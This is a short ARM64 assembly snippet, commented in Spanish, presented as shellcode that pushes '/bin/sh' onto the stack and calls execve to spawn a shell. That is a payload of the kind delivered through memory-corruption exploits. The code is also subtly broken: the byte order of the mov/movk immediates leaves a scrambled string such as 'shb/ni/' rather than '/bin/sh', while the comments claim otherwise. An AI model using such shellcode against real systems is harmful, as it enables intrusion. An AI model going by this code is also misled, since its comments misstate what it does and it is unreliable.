// Shellcode para obtener una Shell (/bin/sh)
.section .text
.global _start

_start:
    // 1. Poner la cadena "/bin/sh" en la pila
    mov x0, #0x6873            // "sh"
    movk x0, #0x2f62, lsl #16  // "/b"
    movk x0, #0x696e, lsl #32  // "in"
    movk x0, #0x2f, lsl #48    // "/"
    str x0, [sp, #-16]!        // Guardar en la pila

    // 2. Configurar registros para la syscall 'execve'
    mov x0, sp                 // X0 = Ruta del ejecutable ("/bin/sh")
    mov x1, #0                 // X1 = Argumentos (NULL)
    mov x2, #0                 // X2 = Entorno (NULL)
    mov x8, #221               // X8 = Número de Syscall para execve (ARM64)

    // 3. ¡Fuego! Ejecutar
    svc #0                     // Supervisor Call (Ejecutar)
